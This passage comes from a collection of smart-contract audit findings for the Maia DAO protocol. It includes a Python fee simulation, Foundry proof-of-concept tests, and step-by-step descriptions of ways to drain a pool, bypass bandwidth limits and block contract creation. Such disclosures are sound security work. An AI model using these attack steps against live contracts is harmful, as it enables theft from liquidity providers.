100\\$ to a bank, the bank increases your balance by 80\\$ and claims itself has got 120\\$.  Q: Why can `sum(pos')-sum(neg') >= sum(pos)` not hold? A: Difficult question! Roughly this could happen when amount is significantly smaller than supply and posFee is excessively large.  Q: How can the pool be modified to a target state? A: There are several methods including \"mint\", \"redeem\" and \"swap\", but the \"deposit\" method should not be used until we reach the target state because attacker will mostly experience losses from that.  Q: Why can the attacker eventually drain the pool? A\uff1aWhen \"mint\", \"redeem\" or \"swap\", the attacker pays exactly the delta value of `_calculateRebalancingFee`. However, when making a \"deposit\", the attacker receives more than what they deserve. At last, by adding liquidity, `_calculateRebalancingFee` can be reduced, so the pool will be drained.  Q: Why don't you provide a coded POC of attack? A: We know \"deposit\" is dangerous and we deprecate it, that's enough.  ## Tools Used Python ``` # -*- coding: utf-8 -*- \"\"\" Created on Mon Jun 19 10:24:56 2023  @author: xuwinnie \"\"\"  from random import *  def getBandwidthUpdateAmounts(roundUp, positiveTransfer, amount, _totalWeights, _totalSupply):     # Get the bandwidth state list length     global length, weightArray, bandwithArray      # Initialize bandwidth update amounts     bandwidthUpdateAmounts = [0] * length     # Initialize bandwidth differences from target bandwidth     diffs = [0] * length      # Total difference from target bandwidth of all bandwidth states     totalDiff = 0     # Total difference from target bandwidth of all bandwidth states     transfered = 0     # Total amount to be distributed according to each bandwidth weights     transferedChange = 0      for i in range(length):         # Load bandwidth and weight from storage         # Bandwidth is the first 248 bits of the slot         bandwidth = bandwithArray[i]         # Weight is the last 8 bits of the slot         weight = weightArray[i]          # Calculate the target bandwidth         targetBandwidth = (_totalSupply * weight) // _totalWeights          # Calculate the difference from the target bandwidth         if positiveTransfer:             # If the transfer is positive, calculate deficit from target bandwidth             if targetBandwidth > bandwidth:                 # Calculate the difference                 diff = targetBandwidth - bandwidth                 # Add the difference to the total difference                 totalDiff += diff                 # Store the difference in the diffs array                 diffs[i] = diff         else:             # If the transfer is negative, calculate surplus from target bandwidth             if bandwidth > targetBandwidth:                 # Calculate the difference                 diff = bandwidth - targetBandwidth                 # Add the difference to the total difference                 totalDiff += diff                 # Store the difference in the diffs array                 diffs[i] = diff      # Calculate the amount to be distributed according deficit/surplus     # and/or the amount to be distributed according to each bandwidth weights     if amount > totalDiff:         # If the amount is greater than the total deficit/surplus         # Total deficit/surplus is distributed         transfered = totalDiff         # Set rest to be distributed according to each bandwidth weights         transferedChange = amount - totalDiff     else:         # If the amount is less than the total deficit/surplus         # Amount will be distributed according to deficit/surplus         transfered = amount      for i in range(length):         # Increase/decrease amount of bandwidth for each bandwidth state         bandwidthUpdate = 0          # If there is a deficit/surplus, calculate the amount to be distributed         if transfered > 0:             # Load the difference from the diffs array             diff = diffs[i]              # Calculate the amount to be distributed according to deficit/surplus             if roundUp:                 bandwidthUpdate = (transfered * diff + totalDiff - 1) // totalDiff             else:                 bandwidthUpdate = (transfered * diff) // totalDiff         # If there is a rest, calculate the amount to be distributed according to each bandwidth weights         if transferedChange > 0:             # Load weight from storage             weight = weightArray[i]              # Calculate the amount to be distributed according to each bandwidth weights             if roundUp:                 bandwidthUpdate += (transferedChange * weight + _totalWeights - 1) // _totalWeights             else:                 bandwidthUpdate += (transferedChange * weight) // _totalWeights          # If there is an update in bandwidth         if bandwidthUpdate > 0:             # Store the amount to be updated in the bandwidthUpdateAmounts array             bandwidthUpdateAmounts[i] = bandwidthUpdate      return (bandwidthUpdateAmounts, length)  def updateBandwidth(depositFees, positiveTransfer, destinationState, difference, _totalWeights, _totalSupply, _newTotalSupply):     global weightArray, bandwithArray          print(\"  updating \"+str(destinationState)+\" with diffrence \"+str(difference))     bandwidth = bandwithArray[destinationState]     print(\"    old bandwith \"+str(bandwidth))     weight = weightArray[destinationState]      # Get the target bandwidth     targetBandwidth = (_totalSupply * weight) // _totalWeights      # Get the rebalancing fee prior to updating the bandwidth     oldRebalancingFee = calculateRebalancingFee(bandwidth, targetBandwidth, positiveTransfer)      if positiveTransfer:         # If the transfer is positive         # Add the difference to the bandwidth         bandwidth += difference      else:         # If the transfer is negative         # Subtract the difference from the bandwidth         bandwidth -= difference      if _newTotalSupply > 0:         # True on deposit, mint and redeem         # Get the new target bandwidth after total supply change         targetBandwidth = (_newTotalSupply * weight) // _totalWeights      # Get the rebalancing fee after updating the bandwidth     newRebalancingFee = calculateRebalancingFee(bandwidth, targetBandwidth, positiveTransfer)      positiveFee, negativeFee = 0, 0     if newRebalancingFee < oldRebalancingFee:         # If new fee is lower than old fee         # Calculate the positive fee         positiveFee = oldRebalancingFee - newRebalancingFee         print(\"    positiveFee \"+str(positiveFee))          if depositFees:             # If depositFees is true, add the positive fee to the bandwidth             bandwidth += positiveFee      else:         # If new fee is higher than old fee         if newRebalancingFee > oldRebalancingFee:             # Calculate the negative fee             negativeFee = newRebalancingFee - oldRebalancingFee             print(\"    negativeFee \"+str(negativeFee))             #raise Exception(\"good\")         else: print(\"    no fee\")      # Update storage with the new bandwidth     bandwithArray[destinationState] = bandwidth     print(\"    new bandwith \"+str(bandwidth))      return (positiveFee, negativeFee)  def calculateRebalancingFee(bandwidth, targetBandwidth, roundDown):     # If the bandwidth is larger or equal to the target bandwidth, return 0     if bandwidth >= targetBandwidth:         return 0      # Fee tier 1 (fee % divided by 2)     lambda1 = int(20e14)     # Fee tier 2 (fee % divided by 2)     lambda2 = int(4980e14)     # Get sigma2 from the first 8 bytes of the fee slot     sigma2 = int(500e14)     # Get sigma1 from the next 8 bytes of the fee slot     sigma1 = int(6000e14)          # Calculate the upper bound for the first fee     upperBound1 = (targetBandwidth * sigma1) // DIVISIONER     # Calculate the upper bound for the second fee     upperBound2 = (targetBandwidth * sigma2) // DIVISIONER      if bandwidth >= upperBound1:         return 0      maxWidth = upperBound1 - upperBound2      # If the bandwidth is smaller than upperBound2     if bandwidth >= upperBound2:         # Calculate the fee for the first interval         fee = calcFee(lambda1, maxWidth, upperBound1, bandwidth, 0, roundDown)     else:         # Calculate the fee for the first interval         fee = calcFee(lambda1, maxWidth, upperBound1, upperBound2, 0, roundDown)          # offset = lambda1 * 2         lambda1 *= 2          # Calculate the fee for the second interval         fee2 = calcFee(lambda2, upperBound2, upperBound2, bandwidth, lambda1, roundDown)          # Add the two fees together         fee += fee2              return fee   def calcFee(feeTier, maxWidth, upperBound, bandwidth, offset, roundDown):     # Calculate the height of the trapezium     height = upperBound - bandwidth      # Calculate the width of the trapezium, rounded up     width = ((height * feeTier + maxWidth - 1) // maxWidth) + offset      # Calculate the fee for this tier     if roundDown:         fee = (width * height) // DIVISIONER     else:         fee = (width * height + DIVISIONER - 1) // DIVISIONER     return fee  def mint(amount):     print(\"minting \"+str(amount)+\" underlying\")     global LPBalance, UnderBalance, totalWeights, totalSupply, poolBalance          _totalWeights = totalWeights     _totalSupply = totalSupply     _newTotalSupply = _totalSupply + amount      bandwidthUpdateAmounts, length = getBandwidthUpdateAmounts(True, True, amount, _totalWeights, _newTotalSupply)      output = 0     negativeFee = 0     i = 0     while i < length:         updateAmount = bandwidthUpdateAmounts[i]         if updateAmount > 0:             output += updateAmount          _positiveFee, _negativeFee = updateBandwidth(False, True, i, updateAmount, _totalWeights, _totalSupply, _newTotalSupply)          if _positiveFee > 0:             negativeFee += _positiveFee         else:             output += _negativeFee         i += 1      if negativeFee > output:         #raise Exception(\"Underflow()\")         pass      output -= negativeFee          LPBalance += output          if output > UnderBalance:         raise Exception(\"Underflow()\")     UnderBalance -= output          totalSupply += amount     poolBalance += output     print(\"receiving \"+str(output)+\" lp\")     print()      def deposit(amount):     print(\"depositing \"+str(amount)+\" underlying\")     global LPBalance, UnderBalance, totalWeights, totalSupply, poolBalance          _totalWeights = totalWeights     _totalSupply = totalSupply     _newTotalSupply = _totalSupply + amount      bandwidthUpdateAmounts, length = getBandwidthUpdateAmounts(False, True, amount, _totalWeights, _newTotalSupply)      output = 0     negativeFee = 0     i = 0     while i < length:         updateAmount = bandwidthUpdateAmounts[i]         if updateAmount > 0:             output += updateAmount          _positiveFee, _negativeFee = updateBandwidth(True, True, i, updateAmount, _totalWeights, _totalSupply, _newTotalSupply)          if _positiveFee > 0:             output += _positiveFee         else:             negativeFee += _negativeFee          i += 1      if negativeFee > output:         raise Exception(\"Underflow()\")      output -= negativeFee          LPBalance += output          if amount > UnderBalance:         raise Exception(\"Underflow()\")     UnderBalance -= amount          totalSupply += output     poolBalance += amount     print(\"receiving \"+str(output)+\" lp\")     print()      def redeem(amount):     print(\"redeeming \"+str(amount)+\" lp\")     global LPBalance, UnderBalance, totalWeights, totalSupply, poolBalance          totalSupply -= amount          if amount > LPBalance:         raise Exception(\"Underflow()\")             LPBalance -= amount          _totalWeights = totalWeights     _newTotalSupply = totalSupply     _totalSupply = _newTotalSupply + amount      bandwidthUpdateAmounts, length = getBandwidthUpdateAmounts(False, False, amount, _totalWeights, _totalSupply)      output = 0     negativeFee = 0     i = 0     while i < length:         updateAmount = bandwidthUpdateAmounts[i]         if updateAmount > 0:             output += updateAmount          _positiveFee, _negativeFee = updateBandwidth(False, False, i, updateAmount, _totalWeights, _totalSupply, _newTotalSupply)         #if _positiveFee > 0:             #raise Exception(\"nooooo()\")         negativeFee += _negativeFee          i += 1      if negativeFee > output:         raise Exception(\"Underflow()\")     output -= negativeFee          UnderBalance += output     poolBalance -= output     print(\"receiving \"+str(output)+\" underlying\")     print()      def getIdealPoolBalance():     global length, bandwithArray, weightArray, totalWeights, totalSupply     assets = 0      for i in range(length):         targetBandwidth = totalSupply * weightArray[i] // totalWeights         assets += calculateRebalancingFee(bandwithArray[i], targetBandwidth, False)         #print(calculateRebalancingFee(bandwithArray[i], targetBandwidth, False))         assets += bandwithArray[i]         #print(bandwithArray[i])          return assets  def getFeeStatus():     global length, bandwithArray, weightArray, totalWeights, totalSupply     assets = 0      for i in range(length):         targetBandwidth = totalSupply * weightArray[i] // totalWeights         assets += calculateRebalancingFee(bandwithArray[i], targetBandwidth, False)         print(i)         print(calculateRebalancingFee(bandwithArray[i], targetBandwidth, False))          return assets  ''' cnt = 0 cnttt = 0         recordinso = [] recordluck = []   for i in range(100000):     DIVISIONER = int(1e18)     length = 3     bandwithArray = [randint(0, int(1e27)) for _ in range(length)]     weightArray = [1] + [randint(1, 100) for _ in range(length - 1)]     #weightArray = [1, 1000]     totalWeights = sum(weightArray)     totalSupply = int(1e27)     poolBalance = getIdealPoolBalance()          UnderBalance = 0     beforeFee = getFeeStatus()     #amount = randint(0, int(1e25))     amount = 10000000000     LPBalance = amount     redeem(amount)     afterFee = getFeeStatus()     if poolBalance < getIdealPoolBalance():         print(str(poolBalance)+\" insolvency! \"+str(getIdealPoolBalance()))         cnt += 1         recordinso.append(getIdealPoolBalance() - poolBalance)         raise Exception(\"Strange()\")              if UnderBalance + afterFee > amount + beforeFee :         print(\"lucky!\")         recordluck.append(UnderBalance + afterFee - amount - beforeFee)         cnttt += 1     print(i) print(cnt) print(cnttt)   ''' cnt = 0 cnttt = 0 recordinso = [] recordluck = [] recordcomp = []  for i in range(1):      DIVISIONER = int(1e18)     length = 3     #bandwithArray = [randint(0, int(1e27)) for _ in range(length)]     bandwithArray = [99452334745147595191585509, 4253569467850027815346666, 216725069177793291903286517]     #weightArray = [1] + [randint(1, 100) for _ in range(length - 1)]     weightArray = [1, 59, 47]     totalWeights = sum(weightArray)     totalSupply = int(1e27)     poolBalance = getIdealPoolBalance()          LPBalance = 0     UnderBalance = int(1e26)     beforeFee = getFeeStatus()     #amount = randint(0, int(1e10))     amount = 10000000      deposit(amount)     afterFee = getFeeStatus()      if poolBalance < getIdealPoolBalance():         print(str(poolBalance)+\" insolvency! \"+str(getIdealPoolBalance()))         cnt += 1         recordinso.append(getIdealPoolBalance() - poolBalance)         recordcomp.append(LPBalance + afterFee - amount - beforeFee)         #raise Exception(\"good\")              if LPBalance + afterFee > amount + beforeFee:         print(\"lucky!\")         cnttt += 1         recordluck.append(LPBalance + afterFee - amount - beforeFee)         #break     print(i) print(cnt) print(cnttt) ``` ## Recommended Mitigation Steps Deprecate the \"deposit\" method. It is hard to find a correct way to handle this.   ## Assessed type  Context"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/429", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-16"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/K42-Analysis.md)."}, {"title": "Wrong consideration of blockformation period causes incorrect votingPeriod and votingDelay calculations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/417", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-25"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L18-L27 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L68-L72 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L397-L423   # Vulnerability details  ## Impact In GovernorBravoDelegateMaias.sol contract, There are wrong calculation in [MIN_VOTING_PERIOD](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L18),[MAX_VOTING_PERIOD](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L21C29-L21C46), [MIN_VOTING_DELAY](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L24), [MAX_VOTING_DELAY](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L27) because of incorrect consideration of block formation period.   The contracts will be deployed on Ethereum mainnet Chain too and in a Ethereum mainnet chain, the blocks are made every 12 seconds but the votingPeriod and votingDelay variables has used 15 seconds while calculating their values.  **For example:**  MIN_VOTING_PERIOD is considered for 2 weeks.  ```Solidity    uint256 public constant MIN_VOTING_PERIOD = 80640; // About 2 weeks ```  2 weeks(in seconds) = 12,09,600 Considered Ethereum blockformation time in second = 15  Therefore, MAX_VOTING_PERIOD = 12,09,600 / 15 = 80,640 (blocks).   This is how the calculations have arrived for other votingPeriod and votingDelay state variables.  However, Ethereum block formation happens on every 12 seconds and it is confirmed from below sources,  [Reference-01](https://chainstack.com/protocols/ethereum/#Performance) [Reference-02](https://ycharts.com/indicators/ethereum_average_block_time)  **The correct calculation should be with 12 seconds as block formation period.**  **For example:** 2 weeks(in seconds) = 12,09,600 Actual Ethereum blockformation time in second = 12  Therefore, MAX_VOTING_PERIOD = 12,09,600 / 12 = 100,800 (blocks).   Total number of block difference for 2 week duration = 100,800 - 80,640 = 20,160 ~ 5.6 hours This much time difference will affect the function validations which will cause unexpected design failure.  [MIN_VOTING_PERIOD](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L18),[MAX_VOTING_PERIOD](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L21C29-L21C46), [MIN_VOTING_DELAY](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L24), [MAX_VOTING_DELAY](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L27) are used in functions which are further explained as below,  ```Solidity File: src/governance/GovernorBravoDelegateMaia.sol  56    function initialize( 57        address timelock_, 58        address govToken_, 59        uint256 votingPeriod_, 60        uint256 votingDelay_, 61        uint256 proposalThreshold_ 62    ) public virtual { 63        require(address(timelock) == address(0), \"GovernorBravo::initialize: can only initialize once\"); 64        require(msg.sender == admin, \"GovernorBravo::initialize: admin only\"); 65        require(timelock_ != address(0), \"GovernorBravo::initialize: invalid timelock address\"); 66        require(govToken_ != address(0), \"GovernorBravo::initialize: invalid govToken address\"); 67        require( 68            votingPeriod_ >= MIN_VOTING_PERIOD && votingPeriod_ <= MAX_VOTING_PERIOD, 69            \"GovernorBravo::initialize: invalid voting period\" 70        ); 71        require( 72            votingDelay_ >= MIN_VOTING_DELAY && votingDelay_ <= MAX_VOTING_DELAY, 73            \"GovernorBravo::initialize: invalid voting delay\" 74        );           // some code ``` At L-68 and L-72, these state variables are used to validate the conditions in initialize() function which can be called only once. These incorrect values makes the conditions at L-68 and L-72 obsolete and the conditions wont work as expected by design.  Further [MIN_VOTING_PERIOD](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L18),[MAX_VOTING_PERIOD](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L21C29-L21C46), [MIN_VOTING_DELAY](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L24), [MAX_VOTING_DELAY](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L27) these state variables are used in below setter functions which for sure wont work as per expected design.  ```Solidity 397  function _setVotingDelay(uint256 newVotingDelay) external {   413   function _setVotingPeriod(uint256 newVotingPeriod) external { ```  #### Discussion with Sponsors I had a discussion with sponsor(@0xbuzzlightyear) on this finding and the sponsor has confirmed the issue. Below is the discord discussion with sponsor for reference and finding confirmation only,   **Mohammed Rizwan \u2014 06/30/2023 at 5:00 PM**      uint256 public constant MIN_VOTING_PERIOD = 80640; // About 2 weeks  Here, it is considered 15 sec for block formation considering Ethereum chain. On ethereum, the average block formation time is 12 sec. Reference- https://ycharts.com/indicators/ethereum_average_block_time Ethereum Average Block Time In depth view into Ethereum Average Block Time including historical data from 2015 to 2023, charts and stats.  **0xbuzzlightyear \u2014 06/30/2023 at 5:06 PM** true, nice finding, we did that before the merge :pepepalm:  **Mohammed Rizwan \u2014 06/30/2023 at 5:07 PM** Thank you. If you allow me, can i add this discussion in report?  **0xbuzzlightyear \u2014 06/30/2023 at 5:09 PM** yes, of course. you are free to do what you wish fren!  **Mohammed Rizwan \u2014 06/30/2023 at 5:09 PM** Thanks again!!!  **0xbuzzlightyear \u2014 06/30/2023 at 5:11 PM** you're welcome! :pepoloveleaf:   ## Proof of Concept https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L18-L27  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L68-L72  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L397-L423  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider 12 seconds block formation period and correct the calculations.   ## Assessed type  Other"}, {"title": "User can bypass bandwidth limit by repeatedly \"balancing\" the pool", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/392", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-20"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesPool.sol#L539-L671   # Vulnerability details  ## Impact The goal with bandwidths is to have a maximum that can be withdrawn (swapped) from a pool, so in case a specific chain (or token from a chain) is exploited, then it only can partially affect these pools. However, the maximum limit can be bypassed by repeatedly \"balancing\" the pool to increase bandwidth for the exploited chain.  ## Introducing \"Balancing\": A Technique for Redistributing Bandwidth During `ulyssesAddLP` or `ulyssesAddLP`, liquidity is first distributed or taken proportionally to `diff` (if any exists), then distributed or taken proportionally to `weight`. Suppose integer `t` is far smaller than `diff` (since the action itself can also change `diff`), after repeatedly adding t LP, removing t lp, adding t LP, removing t Lp ...... the pool will finally reach another stable state where the ratio of `diff` to `weight` is a constant among destinations. This implies that the `currentBandwidth` will be proportional to `weight`.  ## Proof of Concept Suppose Avalanche is down. Unluckily, Alice holds 100 ava-hETH. She wants to swap ava-hETH for bnb-hETH.  Let's take a look at bnb-hETH pool. Suppose weights are mainnet:4, Avalanche:3, Linea:2. Total supply is 90. Target bandwidths are mainnet:40, Avalanche:30, Linea:20. Current bandwidths are mainnet:30, Avalanche:2(few left), Linea:22.  Ideally Alice should only be able to swap for 2 bnb-hETH. However, she swaps for 0.1 bnb-hETH first. Then she uses the 0.1 bnb-hETH to \"balance\" the pool (as mentioned above). Current bandwidths will become mainnet:24, Avalanche:18, Linea:12. Then Alice swaps for 14 bnb-hETH and \"balance\" the pool again. By repeating the process, she can acquire nearly all of the available liquidity in pool and LP loss will be unbounded.  ## Tools Used Manual Review  ## Recommended Mitigation Steps 1. During `ulyssesAddLP` or `ulyssesAddLP`, always distribute or take liquidity proportionally to weight. 2. When swapping A for B, reduce bandwidth of A in B pool (as is currently done) while add bandwidth of B in A pool (instead of distributing them among all bandwidths).   ## Assessed type  Context"}, {"title": "Missing unwrapping of native token in RootBridgeAgent.sweep() causes fees to be stuck", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/385", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-21"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L1259-L1264   # Vulnerability details   `RootBridgeAgent.sweep()` will fail as it tries to transfer `accumulatedFees` using `SafeTransferLib.safeTransferETH()` but fails to unwrap the fees by withdrawing from `wrappedNativeToken`.  ## Impact The `accumulatedFees` will be stuck in `RootBridgeAgent` without any functions to withdraw them.  ## Proof of Concept Add the below test case to `RootTest.t.sol`.      function testPeakboltSweep() public {         //Set up         testAddLocalTokenArbitrum();          //Prepare data         bytes memory packedData;          {             Multicall2.Call[] memory calls = new Multicall2.Call[](1);              //Mock action             calls[0] = Multicall2.Call({target: 0x0000000000000000000000000000000000000000, callData: \"\"});              //Output Params             OutputParams memory outputParams = OutputParams(address(this), newAvaxAssetGlobalAddress, 150 ether, 0);              //RLP Encode Calldata Call with no gas to bridge out and we top up.             bytes memory data = abi.encode(calls, outputParams, ftmChainId);              //Pack FuncId             packedData = abi.encodePacked(bytes1(0x02), data);         }          address _user = address(this);          //Get some gas.         hevm.deal(_user, 1 ether);         hevm.deal(address(ftmPort), 1 ether);          //assure there is enough balance for mock action         hevm.prank(address(rootPort));         ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(address(rootPort), 50 ether, rootChainId);         hevm.prank(address(avaxPort));         ERC20hTokenBranch(avaxMockAssethToken).mint(_user, 50 ether);          //Mint Underlying Token.         avaxMockAssetToken.mint(_user, 100 ether);          //Prepare deposit info         DepositInput memory depositInput = DepositInput({             hToken: address(avaxMockAssethToken),             token: address(avaxMockAssetToken),             amount: 150 ether,             deposit: 100 ether,             toChain: ftmChainId         });          console2.log(\"accumulatedFees (BEFORE) = %d\", multicallBridgeAgent.accumulatedFees());                 //Call Deposit function         avaxMockAssetToken.approve(address(avaxPort), 100 ether);         ERC20hTokenRoot(avaxMockAssethToken).approve(address(avaxPort), 50 ether);          uint128 remoteExecutionGas = 4e9;         uint128 depositedGas = 1e11;          avaxMulticallBridgeAgent.callOutSignedAndBridge{value: depositedGas }(packedData, depositInput, remoteExecutionGas);          console2.log(\"accumulatedFees (AFTER)  = %d\", multicallBridgeAgent.accumulatedFees());                 console2.log(\"WETH Balance = %d \", multicallBridgeAgent.wrappedNativeToken().balanceOf(address(multicallBridgeAgent)));         console2.log(\"ETH Balance = %d \", address(multicallBridgeAgent).balance);          // sweep() will fail as it does not unwrap the WETH before the ETH transfer         multicallBridgeAgent.sweep();      }  ## Recommended Mitigation Steps Add `wrappedNativeToken.withdraw(_accumulatedFees);` to `sweep()` before transfering.    ## Assessed type  Other"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/381", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/max10afternoon-Analysis.md)."}, {"title": "Ulysses omnichain - addbridgeagentfactory in rootPort is not functional", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/372", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-28"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/78e49c651fd119b85bb79296620d5cb39efa7cdd/src/ulysses-omnichain/RootPort.sol#L406-L410   # Vulnerability details  ## Impact the addbridgeagentfactory function is responsible for adding a new bridge agent factory to the root port.   However the current implementation is faulty. the faulty logic is in the following line:           bridgeAgentFactories[bridgeAgentsLenght++] = _bridgeAgentFactory;  a couple of problems here, the function is attempting to access an index that does not yet exist in the bridgeAgentFactories array, this should return an out of bounds error. the function also does not update the isBridgeAgentFactory mapping. once a a new bridge agent factory is added, a new dict item with key equal to address of new bridge agent factory and value of true. this mapping is then used to enable toggling the factory, ie enabling or disabling it via the toggleBridgeAgentFactory function.  Impact: the code hints that this is a key governance action. it does not work at the moment however with regards to impact, at this moment it is unclear from the code what the overall impact would be to the functioning of the protocol, that is why it is rated as medium rather than high. feedback from sponsors is welcome to determine severity.  ## Proof of Concept         function testAddRootBridgeAgentFactoryBricked() public {         //Get some gas         hevm.deal(address(this), 1 ether);          RootBridgeAgentFactory newBridgeAgentFactory = new RootBridgeAgentFactory(             ftmChainId,             WETH9(ftmWrappedNativeToken),             localAnyCallAddress,             address(ftmPort),             dao         );          rootPort.addBridgeAgentFactory(address(newBridgeAgentFactory));                  require(rootPort.bridgeAgentFactories(0)==address(bridgeAgentFactory), \"Initial Factory not in factory list\");         require(rootPort.bridgeAgentFactories(1)==address(newBridgeAgentFactory), \"New Factory not in factory list\");          }  the above POC demonstrates this, it attempts to call the function in question, and returns an \"Index out of bounds\" error.   ## Tools Used  ## Recommended Mitigation Steps         function addBridgeAgentFactory(address _bridgeAgentFactory) external onlyOwner {         // @audit this function is broken         // should by implemented as so         isBridgeAgentFactory[_bridgeAgentFactory] = true;         bridgeAgentFactories.push(_bridgeAgentFactory);         bridgeAgentFactoriesLenght++;          emit BridgeAgentFactoryAdded(_bridgeAgentFactory);     }  the correct implementation is above, this is also identical to how the branch ports implement this functionality.      ## Assessed type  Governance"}, {"title": "`BribesFactory::createBribeFlywheel` can be completely blocked from creating any Flywheel by a malicious actor", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/362", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-29"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/base/FlywheelCore.sol#L125-L129   # Vulnerability details  ## Impact A malicious actor can completely block the creation of any bribe flywheel that is created via `BribesFactory::createBribeFlywheel` because of the way the `FlywheelBribeRewards` parameter is set. Initially it is set [to the zero address in its constructor](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BribesFactory.sol#L84) and then reset to [a different address via the `FlywheelCore::setFlywheelRewards` call](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BribesFactory.sol#L96) (in the same transaction).   ```Solidity     function createBribeFlywheel(address bribeToken) public {         // ...          FlywheelCore flywheel = new FlywheelCore(             bribeToken,             FlywheelBribeRewards(address(0)),             flywheelGaugeWeightBooster,             address(this)         );          // ...          flywheel.setFlywheelRewards(address(new FlywheelBribeRewards(flywheel, rewardsCycleLength)));                  // ...     } ```  The `FlywheelCore::setFlywheelRewards` function verifies if the current `flywheelRewards` address has any balance of the provided reward token and, if so, [transfers it to the new `flywheelRewards` address](https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/base/FlywheelCore.sol#L125-L129).  ```Solidity     function setFlywheelRewards(address newFlywheelRewards) external onlyOwner {         uint256 oldRewardBalance = rewardToken.balanceOf(address(flywheelRewards));         if (oldRewardBalance > 0) {             rewardToken.safeTransferFrom(address(flywheelRewards), address(newFlywheelRewards), oldRewardBalance);         } ```  The issue is that `FlywheelCore::setFlywheelRewards` does not check if the current `FlywheelCore::flywheelRewards` address is 0 and thus attempts to transfer from 0 address if that address has any reward token in it.  A malicious actor can simply send 1 wei of `rewardToken` to the zero address and all `BribesFactory::createBribeFlywheel` will fail because of the attempted transfer of tokens from the 0 address.  This is also an issue for any 3rd party project, that wishes to use MaiaDAO's `BribesFactory` implementation, and uses a burnable reward token because most likely normal users (non-malicious) have already burned (sent to zero address) tokens so the creating of bribe factories would fail by default.  Another observation is that, because all MaiaDAO project tokens use the Solmate ERC20 implementation they [all can transfer to 0 (burn)](https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol#L76-L83) which makes this scenario real even if using project tokens as reward tokens.  ## Proof of Concept  A coded POC follows, add it to `test\\gauges\\factories\\BribesFactoryTest.t.sol`:  ```Solidity     import {stdError} from \"forge-std/Test.sol\";      function 